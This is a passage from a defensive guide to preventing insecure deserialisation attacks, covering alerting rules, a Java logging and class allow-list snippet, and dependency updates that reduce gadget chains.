→ Alert on: unknown class names encountered
→ Alert on: deserialisation failure (possible probe/attack)
→ Alert on: high volume of deserialisation from single IP (automated attack)
→ Monitor: for unexpected outbound connections after deserialisation (RCE indicator)
→ Integrate with SIEM for correlation with other anomaly indicators

Logging example (Java):
logger.info("Deserialisation: class={}, size={}, sourceIP={}",
    desc.getName(), dataSize, request.getRemoteAddr());

if (!ALLOWED_CLASSES.contains(desc.getName())) {
    securityLogger.warn(
        "SECURITY: Rejected deserialisation of class {} from IP {}",
        desc.getName(), request.getRemoteAddr()
    );
    // Alert security team
    // Block source IP if threshold exceeded
}
```

### Strategy 6: Dependency management to eliminate gadget chains 

```
While gadget chain elimination is NOT sufficient as a primary defence,
it reduces attack surface when used alongside other controls:

Java:
→ Upgrade Apache Commons Collections to 3.2.2+ or 4.1+
  (Patched versions break the CommonsCollections gadget chains)
→ Remove unnecessary dependencies from classpath
→ Use dependency analysis tools (OWASP Dependency Check)
→ Keep all libraries updated — new chains discovered regularly

PHP:
→ Remove frameworks/libraries not in active use
→ Audit composer.json for unused dependencies
→ Update all dependencies via: composer update
→ Scan for known vulnerable versions

WHY this is insufficient alone:
→ New gadget chains discovered regularly (ysoserial has 30+ chains)
→ Internal application code may form chains not known publicly
→ Removing one chain leaves others active
→ Cannot guarantee all chains eliminated from complex dependency graph

The PortSwigger and OWASP guidance is clear:
"Don't rely on trying to eliminate gadget chains identified during testing.
It is impractical to try and plug them all."
The root vulnerability is the deserialisation of untrusted data —
only addressing THAT eliminates the threat class entirely.
```
